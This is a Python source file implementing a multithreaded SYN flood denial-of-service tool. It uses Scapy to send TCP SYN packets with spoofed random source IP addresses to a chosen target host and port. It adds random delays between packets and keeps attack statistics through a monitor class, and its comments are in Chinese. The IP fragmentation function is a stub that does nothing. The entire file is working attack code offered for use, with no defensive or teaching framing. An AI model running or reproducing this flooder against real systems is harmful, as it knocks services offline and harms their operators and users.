import socket
import random
from scapy.all import IP, TCP, send
import threading
import time
from utils.monitor import AttackMonitor

class SYNFlood:
    def __init__(self, target_ip, target_port, num_threads=4):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.running = False
        self.monitor = AttackMonitor()
        self.packet_count = 0
    
    def generate_random_ip(self):
        """生成随机源IP地址"""
        return f"{random.randint(1,254)}.{random.randint(1,254)}." \
               f"{random.randint(1,254)}.{random.randint(1,254)}"
    
    def fragment_packet(self, packet):
        """实现IP分片"""
        return packet
    
    def syn_flood(self):
        while self.running:
            source_ip = self.generate_random_ip()
            source_port = random.randint(1024, 65535)
            
            # 构建IP和TCP包
            ip_packet = IP(src=source_ip, dst=self.target_ip)
            tcp_packet = TCP(
                sport=source_port,
                dport=self.target_port,
                flags="S",
                seq=random.randint(0, 65535)
            )
            
            # IP分片处理
            packet = self.fragment_packet(ip_packet/tcp_packet)
            
            try:
                send(packet, verbose=False)
                self.packet_count += 1
                self.monitor.update_stats("syn_flood", 1)
                time.sleep(random.uniform(0.01, 0.05))  # 随机延迟
            except Exception as e:
                print(f"发送失败: {e}")
    
    def start_attack(self):
        self.running = True
        threads = []
        
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.syn_flood)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # 启动监控线程
        monitor_thread = threading.Thread(target=self.monitor.start_monitoring)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        return threads
    
    def stop_attack(self):
        self.running = False
        return self.monitor.get_stats() 